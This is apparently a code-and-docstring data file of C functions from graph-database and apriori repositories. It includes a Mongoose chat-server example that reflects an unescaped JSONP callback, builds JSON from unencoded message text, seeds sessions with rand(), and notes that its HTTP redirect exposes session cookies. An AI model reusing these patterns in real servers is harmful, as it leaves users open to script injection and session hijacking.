{"docstring": "// Get a get of messages with IDs greater than last_id and transform them\n// into a JSON string. Return that string to the caller. The string is\n// dynamically allocated, caller must free it. If there are no messages,\n// NULL is returned.\n", "func_signal": "static char *messages_to_json(long last_id)", "code": "{\n  const struct message *message;\n  int max_msgs, len;\n  char buf[sizeof(messages)];  // Large enough to hold all messages\n\n  // Read-lock the ringbuffer. Loop over all messages, making a JSON string.\n  pthread_rwlock_rdlock(&rwlock);\n  len = 0;\n  max_msgs = sizeof(messages) / sizeof(messages[0]);\n  // If client is too far behind, return all messages.\n  if (last_message_id - last_id > max_msgs) {\n    last_id = last_message_id - max_msgs;\n  }\n  for (; last_id < last_message_id; last_id++) {\n    message = &messages[last_id % max_msgs];\n    if (message->timestamp == 0) {\n      break;\n    }\n    // buf is allocated on stack and hopefully is large enough to hold all\n    // messages (it may be too small if the ringbuffer is full and all\n    // messages are large. in this case asserts will trigger).\n    len += snprintf(buf + len, sizeof(buf) - len,\n        \"{user: '%s', text: '%s', timestamp: %lu, id: %lu},\",\n        message->user, message->text, message->timestamp, message->id);\n    assert(len > 0);\n    assert((size_t) len < sizeof(buf));\n  }\n  pthread_rwlock_unlock(&rwlock);\n\n  return len == 0 ? NULL : strdup(buf);\n}", "path": "tests\\stinger\\lib\\mongoose\\examples\\chat.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/**\n* @brief Remove a stream from a workflow by its index in the workflow.\n*\n* @param workflow The workflow from which to remove the stream.\n* @param index Which stream to remove in the internal order.\n*\n* @return The same workflow as the input for chaining.\n*/\n", "func_signal": "stinger_workflow_t *\nstinger_workflow_unregister_stream_by_index(stinger_workflow_t * workflow, int64_t index)", "code": "{\n  for(uint64_t i = index; i < workflow->stream_count-1; i++) {\n    workflow->streams[i].name\t      = workflow->streams[i+1].name;\n    workflow->streams[i].workspace    = workflow->streams[i+1].workspace;\n    workflow->streams[i].init         = workflow->streams[i+1].init;\n    workflow->streams[i].settings     = workflow->streams[i+1].settings;\n    workflow->streams[i].stream_batch = workflow->streams[i+1].stream_batch;\n    workflow->streams[i].cleanup      = workflow->streams[i+1].cleanup;\n  }\n  workflow->stream_count--;\n  return workflow;\n}", "path": "tests\\stinger\\src\\core\\stinger-workflow.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/**\n* @brief Create a new STINGER workflow.\n*\n* @param S The STINGER that will store the graph in this workflow.\n*\n* @return A pointer to the newly created workflow.\n*/\n", "func_signal": "stinger_workflow_t * \nstinger_workflow_new(stinger_t * S)", "code": "{\n\n  stinger_workflow_t * workflow = xmalloc(sizeof(stinger_workflow_t));\n\n  workflow->integrated\t\t= 0;\n  workflow->S\t\t\t= S;\n  workflow->alg_count\t\t= 0;\n  workflow->alg_size\t\t= 10;\n  workflow->algorithms\t\t= xmalloc(workflow->alg_size * sizeof(stinger_alg_t));\n  workflow->stream_count\t= 0;\n  workflow->stream_size\t\t= 10;\n  workflow->streams\t\t= xmalloc(workflow->stream_size * sizeof(stinger_stream_t));\n  workflow->named_result_count\t= 0;\n  workflow->named_result_size\t= 10;\n  workflow->named_results\t= xmalloc(workflow->named_result_size * sizeof(stinger_named_result_t *));\n\n  return workflow;\n}", "path": "tests\\stinger\\src\\core\\stinger-workflow.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/**\n* @brief Initialize the system timer\n*/\n", "func_signal": "void\ninit_timer (void)", "code": "{\n  int err;\n  err = clock_getcpuclockid (0, &clockid);\n  if (err >= 0)\n    return;\n  fprintf (stderr, \"Unable to find CPU clock, falling back to \"\n           CLKIDNAME \"\\n\");\n  clockid = CLKID;\n}", "path": "rmatter\\src\\timer.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/**\n* @brief Remove an algorithm from the workflow by its name.\n*\n* Names that aren't found are silently ignored.  This function <strong>will not</strong>\n* call the provided cleanup function.\n*\n* @param workflow The workflow from which to remove the algorithm.\n* @param name The name of the workflow to be removed (must match).\n*\n* @return The same workflow as the input for chaining.\n*/\n", "func_signal": "stinger_workflow_t *\nstinger_workflow_unregister_alg(stinger_workflow_t * workflow, char * name)", "code": "{\n  for(uint64_t i = 0; i < workflow->alg_count; i++) {\n    if(0 == strcmp(workflow->algorithms[i].name, name)) {\n      return stinger_workflow_unregister_alg_by_index(workflow, i);\n    }\n  }\n  return workflow;\n}", "path": "tests\\stinger\\src\\core\\stinger-workflow.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/**\n* @brief Stop the timer and return the time taken\n*\n* @return Time since last tic()\n*/\n", "func_signal": "double\ntoc (void)", "code": "{\n  const double t = timer ();\n  const double out = t - last_tic;\n  last_tic = t;\n  return out;\n}", "path": "rmatter\\src\\timer.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/**\n* @brief Free a STINGER workflow and its internal memory. Sets the pointer to NULL.\n*\n* @param workflow The workflow.\n*\n* @return Returns a NYLL pointer.\n*/\n", "func_signal": "stinger_workflow_t * \nstinger_workflow_free(stinger_workflow_t ** workflow)", "code": "{\n\n  if(*workflow) {\n    if((*workflow)->algorithms) {\n      free((*workflow)->algorithms);\n    }\n    if((*workflow)->streams) {\n      free((*workflow)->streams);\n    }\n    free(*workflow);\n  }\n\n  return *workflow;\n}", "path": "tests\\stinger\\src\\core\\stinger-workflow.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "// Allocate new session object\n", "func_signal": "static struct session *new_session(void)", "code": "{\n  int i;\n  time_t now = time(NULL);\n  pthread_rwlock_wrlock(&rwlock);\n  for (i = 0; i < MAX_SESSIONS; i++) {\n    if (sessions[i].expire == 0 || sessions[i].expire < now) {\n      sessions[i].expire = time(0) + SESSION_TTL;\n      break;\n    }\n  }\n  pthread_rwlock_unlock(&rwlock);\n  return i == MAX_SESSIONS ? NULL : &sessions[i];\n}", "path": "tests\\stinger\\lib\\mongoose\\examples\\chat.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ *\n * STINGER VERTICES\n * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */\n", "func_signal": "inline stinger_vertices_t *\nstinger_vertices_new(int64_t max_vertices)", "code": "{\n  stinger_vertices_t * rtn = calloc(1, sizeof(stinger_vertices_t) + max_vertices * sizeof(stinger_vertex_t));\n  rtn->max_vertices = max_vertices;\n  return rtn;\n}", "path": "tests\\stinger\\src\\core\\stinger-vertex.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "// If \"callback\" param is present in query string, this is JSONP call.\n// Return 1 in this case, or 0 if \"callback\" is not specified.\n// Wrap an output in Javascript function call.\n", "func_signal": "static int handle_jsonp(struct mg_connection *conn,\n                        const struct mg_request_info *request_info)", "code": "{\n  char cb[64];\n\n  get_qsvar(request_info, \"callback\", cb, sizeof(cb));\n  if (cb[0] != '\\0') {\n    mg_printf(conn, \"%s(\", cb);\n  }\n\n  return cb[0] == '\\0' ? 0 : 1;\n}", "path": "tests\\stinger\\lib\\mongoose\\examples\\chat.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/**\n* @brief Remove a stream from a workflow by its name.\n*\n* @param workflow The workflow from which to remove the stream.\n* @param name Name of the algorithm to remove.  <string>Must match</strong>.\n*\n* @return The same workflow as the input for chaining.\n*/\n", "func_signal": "stinger_workflow_t *\nstinger_workflow_unregister_stream(stinger_workflow_t * workflow, char * name)", "code": "{\n  for(uint64_t i = 0; i < workflow->stream_count; i++) {\n    if(0 == strcmp(workflow->streams[i].name, name)) {\n      return stinger_workflow_unregister_stream_by_index(workflow, i);\n    }\n  }\n  return workflow;\n}", "path": "tests\\stinger\\src\\core\\stinger-workflow.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "// Return 1 if request is authorized, 0 otherwise.\n", "func_signal": "static int is_authorized(const struct mg_connection *conn,\n                         const struct mg_request_info *request_info)", "code": "{\n  struct session *session;\n  char valid_id[33];\n  int authorized = 0;\n\n  // Always authorize accesses to login page and to authorize URI\n  if (!strcmp(request_info->uri, login_url) ||\n      !strcmp(request_info->uri, authorize_url)) {\n    return 1;\n  }\n\n  pthread_rwlock_rdlock(&rwlock);\n  if ((session = get_session(conn)) != NULL) {\n    generate_session_id(valid_id, session->random, session->user);\n    if (strcmp(valid_id, session->session_id) == 0) {\n      session->expire = time(0) + SESSION_TTL;\n      authorized = 1;\n    }\n  }\n  pthread_rwlock_unlock(&rwlock);\n\n  return authorized;\n}", "path": "tests\\stinger\\lib\\mongoose\\examples\\chat.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/**\n* @brief Get the resolution of the system clock\n*\n* @return Clock Resolution\n*/\n", "func_signal": "double\ntimer_getres (void)", "code": "{\n  struct timespec tp;\n  clock_getres (clockid, &tp);\n  return (double) tp.tv_sec + 1.0e-9 * (double) tp.tv_nsec;\n}", "path": "rmatter\\src\\timer.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "// A handler for the /authorize endpoint.\n// Login page form sends user name and password to this endpoint.\n", "func_signal": "static void authorize(struct mg_connection *conn,\n                      const struct mg_request_info *request_info)", "code": "{\n  char user[MAX_USER_LEN], password[MAX_USER_LEN];\n  struct session *session;\n\n  // Fetch user name and password.\n  get_qsvar(request_info, \"user\", user, sizeof(user));\n  get_qsvar(request_info, \"password\", password, sizeof(password));\n\n  if (check_password(user, password) && (session = new_session()) != NULL) {\n    // Authentication success:\n    //   1. create new session\n    //   2. set session ID token in the cookie\n    //   3. remove original_url from the cookie - not needed anymore\n    //   4. redirect client back to the original URL\n    //\n    // The most secure way is to stay HTTPS all the time. However, just to\n    // show the technique, we redirect to HTTP after the successful\n    // authentication. The danger of doing this is that session cookie can\n    // be stolen and an attacker may impersonate the user.\n    // Secure application must use HTTPS all the time.\n    my_strlcpy(session->user, user, sizeof(session->user));\n    snprintf(session->random, sizeof(session->random), \"%d\", rand());\n    generate_session_id(session->session_id, session->random, session->user);\n    send_server_message(\"<%s> joined\", session->user);\n    mg_printf(conn, \"HTTP/1.1 302 Found\\r\\n\"\n        \"Set-Cookie: session=%s; max-age=3600; http-only\\r\\n\"  // Session ID\n        \"Set-Cookie: user=%s\\r\\n\"  // Set user, needed by Javascript code\n        \"Set-Cookie: original_url=/; max-age=0\\r\\n\"  // Delete original_url\n        \"Location: /\\r\\n\\r\\n\",\n        session->session_id, session->user);\n  } else {\n    // Authentication failure, redirect to login.\n    redirect_to_login(conn, request_info);\n  }\n}", "path": "tests\\stinger\\lib\\mongoose\\examples\\chat.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/**\n* @brief Remove an algorithm from the workflow by its index.\n*\n* @param workflow The workflow from which to remove the algorithm.\n* @param index Index of the algorithm within the workflow.\n*\n* @return The same workflow as the input for chaining.\n*/\n", "func_signal": "stinger_workflow_t *\nstinger_workflow_unregister_alg_by_index(stinger_workflow_t * workflow, int64_t index)", "code": "{\n  for(uint64_t i = index; i < workflow->alg_count-1; i++) {\n    workflow->algorithms[i].name\t  = workflow->algorithms[i+1].name;\n    workflow->algorithms[i].workspace\t  = workflow->algorithms[i+1].workspace;\n    workflow->algorithms[i].init\t  = workflow->algorithms[i+1].init;\n    workflow->algorithms[i].settings\t  = workflow->algorithms[i+1].settings;\n    workflow->algorithms[i].before_batch  = workflow->algorithms[i+1].before_batch;\n    workflow->algorithms[i].after_batch\t  = workflow->algorithms[i+1].after_batch;\n    workflow->algorithms[i].cleanup\t  = workflow->algorithms[i+1].cleanup;\n  }\n  workflow->alg_count--;\n  return workflow;\n}", "path": "tests\\stinger\\src\\core\\stinger-workflow.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "// Get session object for the connection. Caller must hold the lock.\n", "func_signal": "static struct session *get_session(const struct mg_connection *conn)", "code": "{\n  int i;\n  char session_id[33];\n  time_t now = time(NULL);\n  mg_get_cookie(conn, \"session\", session_id, sizeof(session_id));\n  for (i = 0; i < MAX_SESSIONS; i++) {\n    if (sessions[i].expire != 0 &&\n        sessions[i].expire > now &&\n        strcmp(sessions[i].session_id, session_id) == 0) {\n      break;\n    }\n  }\n  return i == MAX_SESSIONS ? NULL : &sessions[i];\n}", "path": "tests\\stinger\\lib\\mongoose\\examples\\chat.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "// A handler for the /ajax/send_message endpoint.\n", "func_signal": "static void ajax_send_message(struct mg_connection *conn,\n                              const struct mg_request_info *request_info)", "code": "{\n  struct message *message;\n  struct session *session;\n  char text[sizeof(message->text) - 1];\n  int is_jsonp;\n\n  mg_printf(conn, \"%s\", ajax_reply_start);\n  is_jsonp = handle_jsonp(conn, request_info);\n\n  get_qsvar(request_info, \"text\", text, sizeof(text));\n  if (text[0] != '\\0') {\n    // We have a message to store. Write-lock the ringbuffer,\n    // grab the next message and copy data into it.\n    pthread_rwlock_wrlock(&rwlock);\n    message = new_message();\n    // TODO(lsm): JSON-encode all text strings\n    session = get_session(conn);\n    assert(session != NULL);\n    my_strlcpy(message->text, text, sizeof(text));\n    my_strlcpy(message->user, session->user, sizeof(message->user));\n    pthread_rwlock_unlock(&rwlock);\n  }\n\n  mg_printf(conn, \"%s\", text[0] == '\\0' ? \"false\" : \"true\");\n\n  if (is_jsonp) {\n    mg_printf(conn, \"%s\", \")\");\n  }\n}", "path": "tests\\stinger\\lib\\mongoose\\examples\\chat.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "// Redirect user to the login form. In the cookie, store the original URL\n// we came from, so that after the authorization we could redirect back.\n", "func_signal": "static void redirect_to_login(struct mg_connection *conn,\n                              const struct mg_request_info *request_info)", "code": "{\n  mg_printf(conn, \"HTTP/1.1 302 Found\\r\\n\"\n      \"Set-Cookie: original_url=%s\\r\\n\"\n      \"Location: %s\\r\\n\\r\\n\",\n      request_info->uri, login_url);\n}", "path": "tests\\stinger\\lib\\mongoose\\examples\\chat.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "// Allocate new message. Caller must hold the lock.\n", "func_signal": "static struct message *new_message(void)", "code": "{\n  static int size = sizeof(messages) / sizeof(messages[0]);\n  struct message *message = &messages[last_message_id % size];\n  message->id = last_message_id++;\n  message->timestamp = time(0);\n  return message;\n}", "path": "tests\\stinger\\lib\\mongoose\\examples\\chat.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "void nst_delete (NSTATS *nst)", "code": "{ free(nst); }                  /* --- delete numerical statistics */\n\n/*--------------------------------------------------------------------*/\n\nvoid nst_reg (NSTATS *nst, const double *vec, double weight)\n{                               /* --- register a data vector */\n  int    i;                     /* loop variable */\n  double *min, *max;            /* to traverse the min./max. values */\n  double *sum, *sqr;            /* to traverse the value sums */\n  double *off, *fac;            /* to traverse the offsets/scales */\n  double t;                     /* temporary buffer */\n\n  assert(nst && vec);           /* check the function arguments */\n  sum = nst->sums;              /* get the vectors for the sums */\n  sqr = nst->sqrs;              /* and the sums of squares */\n  if (!vec) {                   /* if to terminate registration */\n    off = nst->offs;            /* get the offsets and */\n    fac = nst->facs;            /* the scaling factors */\n    if (nst->reg <= 0)          /* if no patterns are registered */\n      for (i = nst->dim; --i >= 0; ) { off[i] = 0; fac[i] = 1; }\n    else {                      /* if patterns have been registered */\n      for (i = nst->dim; --i >= 0; ) {      /* traverse the vectors */\n        off[i] = sum[i] /nst->reg;\n        t      = sqr[i] -off[i] *sum[i];\n        fac[i] = (t > 0) ? sqrt(nst->reg /t) : 1;\n      }                         /* estimate the parameters */\n    }\n    if (weight < 0) {           /* if to reinitialize registration */\n      for (i = nst->dim; --i >= 0; )\n        sum[i] = sqr[i] = 0;    /* reinitialize the vectors */\n      nst->reg = 0;             /* and the pattern counter */\n    } }\n  else {                        /* if to register a data vector */\n    min = nst->mins;            /* get the minimal */\n    max = nst->maxs;            /* and the maximal values */\n    for (i = nst->dim; --i >= 0; ) {\n      if (vec[i] < min[i]) min[i] = vec[i];\n      if (vec[i] > max[i]) max[i] = vec[i];\n      sum[i] += vec[i];         /* update the ranges of values */\n      sqr[i] += vec[i] *vec[i]; /* and sum the values */\n    }                           /* and their squares */\n    nst->reg += weight;         /* count the pattern */\n  }\n}", "path": "ext\\util\\src\\nstats.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "// Our 'test1' method.. it simply returns a value of '10' for now.\n", "func_signal": "VALUE method_test1(VALUE self)", "code": "{\n\tint x = 10;\n\treturn INT2NUM(x);\n}", "path": "attic\\c_ext_test1\\MyTest\\MyTest.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "void nst_scale (NSTATS *nst, int idx, double off, double fac)", "code": "{                               /* --- set (linear) scaling */\n  int i;                        /* loop variable */\n\n  assert(nst && (idx < nst->dim));  /* check the arguments */\n  if (idx < 0) { i = nst->dim; idx = 0; }\n  else         { i = idx +1; }  /* get index range to set */\n  while (--i >= idx) {          /* and traverse it */\n    nst->offs[i] = off;         /* set the offset */\n    nst->facs[i] = fac;         /* and the scaling factor */\n  }                             /* for all dimensions in range */\n}", "path": "ext\\util\\src\\nstats.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "int ts_next (TABSCAN *tsc, FILE *file, char *buf, int len)", "code": "{                               /* --- read the next table field */\n  int  c, d;                    /* character read, delimiter type */\n  char *p;                      /* to traverse the buffer */\n\n  assert(tsc && (!buf || (len >= 0)));  /* check function argumens */\n\n  /* --- initialize --- */\n  if (!buf) {                   /* if no buffer given, use internal */\n    buf = tsc->buf; len = TS_SIZE; }\n  p = buf; *p = '\\0';           /* clear the read buffer and */\n  tsc->cnt = 0;                 /* the number of characters read */\n  c = getc(file);               /* get the first character and */\n  if (c == EOF)                 /* check for end of file/error */\n    return tsc->delim = (ferror(file)) ? TS_ERR : TS_EOF;\n\n  /* --- skip comment records --- */\n  if (tsc->delim != 0) {        /* if at the start of a record */\n    while (iscomment(c)) {      /* while the record is a comment */\n      tsc->reccnt++;            /* count the record to be read */\n      while (!isrecsep(c)) {    /* while not at end of record */\n        c = getc(file);         /* get the next character and */\n        if (c == EOF)           /* check for end of file/error */\n          return tsc->delim = (ferror(file)) ? TS_ERR : TS_EOF;\n      }                         /* (read up to a record separator) */\n      c = getc(file);           /* get the next character and */\n      if (c == EOF)             /* check for end of file/error */\n        return tsc->delim = (ferror(file)) ? TS_ERR : TS_EOF;\n    }              \n  }                             /* (comment records are skipped) */\n\n  /* --- skip leading blanks --- */\n  while (isblank(c)) {          /* while character is blank, */\n    c = getc(file);             /* get the next character and */\n    if (c == EOF)               /* check for end of file/error */\n      return tsc->delim = (ferror(file)) ? TS_ERR : TS_REC;\n  }                             /* check for end of file */\n  if (issep(c)) {               /* check for field/record separator */\n    if (isfldsep(c)) return tsc->delim = TS_FLD;\n    tsc->reccnt++;   return tsc->delim = TS_REC;\n  }                             /* if at end of record, count reocrd */\n  /* Note that after at least one valid character was read, even  */\n  /* if it is a blank, the end of file/input is translated into a */\n  /* record separator. -1 is returned only if no character could  */\n  /* be read before the end of file/input is encountered.         */\n\n  /* --- read the field --- */\n  while (1) {                   /* field read loop */\n    if (len > 0) {              /* if the buffer is not full, */\n      len--; *p++ = (char)c; }  /* store the character in the buffer */\n    c = getc(file);             /* get the next character */\n    if (issep(c)) { d = (isfldsep(c))  ? TS_FLD : TS_REC; break; }\n    if (c == EOF) { d = (ferror(file)) ? TS_ERR : TS_REC; break; }\n  }                             /* while character is no separator */\n\n  /* --- remove trailing blanks --- */\n  while (isblank(*--p));        /* while character is blank */\n  *++p = '\\0';                  /* terminate string in buffer */\n  tsc->cnt = (int)(p -buf);     /* store number of characters read */\n  if (d != TS_FLD) {            /* if not at a field separator */\n    if (d == TS_REC) tsc->reccnt++;\n    return tsc->delim = d;      /* if at end of record, count record, */\n  }                             /* and then abort the function */\n\n  /* --- check for a null value --- */\n  while (--p >= buf)            /* check for only null value chars. */\n    if (!isnull((unsigned char)*p)) break;\n  if (p < buf) buf[0] = '\\0';   /* clear buffer if null value */\n  \n  /* --- skip trailing blanks --- */\n  while (isblank(c)) {          /* while character is blank, */\n    c = getc(file);             /* get the next character and */\n    if (c == EOF)               /* check for end of file/error */\n      return tsc->delim = ferror(file) ? TS_ERR : TS_REC;\n  }                             /* check for end of file */\n  if (isrecsep(c)) {            /* check for a record separator */\n    tsc->reccnt++; return tsc->delim = TS_REC; }\n  if (!isfldsep(c))             /* put back character (may be */\n    ungetc(c, file);            /* necessary if blank = field sep.) */\n  return tsc->delim = TS_FLD;   /* return the delimiter type */\n}", "path": "ext\\util\\src\\tabscan.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "void ts_copy (TABSCAN *dst, const TABSCAN *src)", "code": "{                               /* --- copy character flags */\n  int  i;                       /* loop variable */\n  char *d; const char *s;       /* to traverse the character flags */\n\n  assert(src && dst);           /* check the function arguments */\n  s = src->cflags +256; d = dst->cflags +256;\n  for (i = 256; --i >= 0; ) *--d = *--s;\n}", "path": "ext\\util\\src\\tabscan.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*----------------------------------------------------------------------\n  Functions\n----------------------------------------------------------------------*/\n", "func_signal": "void* l_sort (void *list, LCMPFN cmpfn, void *data)", "code": "{                               /* --- sort a list with mergesort */\n  LE *src, *dst;                /* list of source/destination lists */\n  LE **end;                     /* end of list of destination lists */\n  LE *in1, *in2;                /* input lists for merging */\n  LE **out;                     /* output list for merging */\n\n  if (!list) return list;       /* check for an empty list */\n  for (src = list; src->succ; ) {\n    dst = src; src = src->succ; /* traverse the list and split it */\n    dst->succ = NULL;           /* into a list (abused pred ptr.) of */ \n  }                             /* single element lists (succ ptr.) */\n  while (src->pred) {           /* while more than one source list */\n    end = &dst;                 /* start list of destination lists */\n    do {                        /* merge pairs of source lists */\n      out = end;                /* start output list (merged input) */\n      in1 = src;                /* remove two (one) source list(s) */\n      in2 = src->pred;          /* and use them as input for merging */\n      if (!in2) {               /* if there is only one source list */\n        *end = in1; end = &in1->pred;\n        break;                  /* append it to the list of */\n      }                         /* output list and abort the loop */\n      src = in2->pred;          /* remove lists from list of sources */\n      while (1) {               /* source lists merge loop */\n        if (cmpfn(in1, in2, data) < 0) {\n                                /* if first list's element is smaller */\n          *out = in1;           /* move element to output list, */\n          out  = &(in1->succ);  /* advance output pointer and */ \n          in1  = in1->succ;     /* remove element from input list */\n          if (!in1) break; }    /* if the list gets empty, abort loop */\n        else {                  /* if second list's element is smaller */\n          *out = in2;           /* move element to output list, */\n          out  = &(in2->succ);  /* advance output pointer and */\n          in2  = in2->succ;     /* remove element from input list */\n          if (!in2) break;      /* if the list gets empty, abort loop */\n        }                       /* (merge input lists into one) */\n      }\n      if (in1) *out = in1;      /* append remaining elements */\n      else     *out = in2;      /* to the output list */\n      end = &(*end)->pred;      /* advance destination list pointer */\n    } while (src);              /* while there is another source list */\n    *end = NULL;                /* terminate destination list */\n    src  = dst;                 /* transfer destination list */\n  }                             /* to source list and start over */\n  for (src->pred = NULL; src->succ; src = src->succ)\n    src->succ->pred = src;      /* set predecessor pointers */\n  return dst;                   /* return a pointer to the first */\n}", "path": "ext\\util\\src\\listops.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "void ts_reset (TABSCAN *tsc)", "code": "{                               /* --- reset a table scanner */\n  tsc->reccnt =  1;             /* reset the record counter */\n  tsc->delim  = -1;             /* and the field delimiter */\n}", "path": "ext\\util\\src\\tabscan.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "void nst_inorm (NSTATS *nst, const double *vec, double *res)", "code": "{                               /* --- inverse normalize a vector */\n  int    i;                     /* loop variable */\n  double *off, *fac;            /* to traverse the scaling parameters */\n\n  assert(nst && vec && res);    /* check the function arguments */\n  off = nst->offs +(i = nst->dim);\n  fac = nst->facs + i;          /* get the scaling parameters */\n  res += i; vec += i;           /* and the data vectors */\n  while (--i >= 0) *--res = *--vec / *--fac + *--off;\n}", "path": "ext\\util\\src\\nstats.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "void ts_allchs (TABSCAN *tsc, const char *recseps, const char *fldseps,\n                const char *blanks, const char *nullchs,\n                const char *comment)", "code": "{                               /* --- set characters of all classes */\n  if (recseps != NULL) ts_chars(tsc, TS_RECSEP,  recseps);\n  if (fldseps != NULL) ts_chars(tsc, TS_FLDSEP,  fldseps);\n  if (blanks  != NULL) ts_chars(tsc, TS_BLANK,   blanks);\n  if (nullchs != NULL) ts_chars(tsc, TS_NULL,    nullchs);\n  if (comment != NULL) ts_chars(tsc, TS_COMMENT, comment);\n}", "path": "ext\\util\\src\\tabscan.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "void nst_expand (NSTATS *nst, int idx, double factor)", "code": "{                               /* --- expand range of values */\n  int    i;                     /* loop variable */\n  double t;                     /* change of minimal/maximal value */\n\n  assert(nst                    /* check the function arguments */\n     && (idx < nst->dim) && (factor >= 0));\n  if (idx < 0) { i = nst->dim; idx = 0; }\n  else         { i = idx +1; }  /* get index range to expand */\n  while (--i >= idx) {          /* and traverse it */\n    t = (nst->maxs[i] -nst->mins[i]) *(factor -1) *0.5;\n    nst->mins[i] -= t;          /* adapt the minimal */\n    nst->maxs[i] += t;          /* and   the maximal value */\n  }                             /* for all dimensions in range */\n}", "path": "ext\\util\\src\\nstats.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "NSTATS* nst_parse (SCAN *scan, int dim)", "code": "{                               /* --- parse normalization statistics */\n  NSTATS *nst;                  /* created normalization statistics */\n  double *buf = NULL;           /* buffer for reading */\n\n  assert(scan);                 /* check the function arguments */\n  dim = _parse(scan,dim, &buf); /* parse normalization statistics */\n  if (dim < 0) { if (buf) free(buf); return NULL; }\n  nst = nst_create(dim);        /* create a statistics structure */\n  if (!nst)    { free(buf); return NULL; }\n  for (buf += dim +dim; --dim >= 0; ) {\n    nst->facs[dim] = *--buf;    /* copy the buffered values */\n    nst->offs[dim] = *--buf;    /* into the corresponding vectors */\n  }\n  free(buf);                    /* delete the read buffer */\n  return nst;                   /* return the created structure */\n}", "path": "ext\\util\\src\\nstats.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "// The initialization method for this module\n", "func_signal": "void Init_mytest()", "code": "{\n\tMyTest = rb_define_module(\"MyTest\");\n\trb_define_method(MyTest, \"test1\", method_test1, 0);\t\n}", "path": "attic\\c_ext_test1\\MyTest\\MyTest.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "void nst_range (NSTATS *nst, int idx, double min, double max)", "code": "{                               /* --- set range of values */\n  int i;                        /* loop variable */\n\n  assert(nst && (idx < nst->dim));  /* check the arguments */\n  if (idx < 0) { i = nst->dim; idx = 0; }\n  else         { i = idx +1; }  /* get index range to set */\n  while (--i >= idx) {          /* and traverse it */\n    nst->mins[i] = min;         /* set the minimal */\n    nst->maxs[i] = max;         /* and the maximal value */\n  }                             /* for all dimensions in range */\n}", "path": "ext\\util\\src\\nstats.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
